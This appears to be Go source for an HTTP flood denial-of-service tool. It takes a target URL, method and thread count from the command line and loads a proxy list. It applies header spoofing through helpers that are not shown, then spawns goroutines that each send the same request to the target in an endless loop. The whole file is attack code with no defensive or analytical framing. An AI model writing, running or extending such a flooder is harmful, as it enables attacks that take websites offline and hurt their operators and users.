package main

import (
	"log"
	"os"
	"strconv"
	"bufio"
	"github.com/valyala/fasthttp"
)

var target struct {
	url     string
	threads int
	method  string
	a_type  string
}

func httpflood() {
	proxies, err := loadProxies() // Load proxies
	if err != nil {
		log.Fatal(err)
	}

	head := NewHeader(false, nil, proxies) // Pass proxies to NewHeader
	sp := NewSpoof(5)
	client := &fasthttp.Client{}
	req := fasthttp.AcquireRequest()
	req.SetRequestURI(target.url)
	req.Header.SetMethod(target.method)
	head.headers(req)
	sp.spoofS(req)
	for {
		client.Do(req, nil)
	}
}

func loadProxies() ([]string, error) {
	file, err := os.Open("src/proxy.txt")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	proxies := make([]string, 0)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := scanner.Text()
		proxies = append(proxies, proxy)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return proxies, nil
}

func main() {
	target.url = os.Args[1]
	target.method = os.Args[2]
	threads, _ := strconv.Atoi(os.Args[3])
	log.Print("Started...")
	for i := 0; i < threads; i++ {
		go httpflood()
	}

	<-make(chan bool, 1)
}
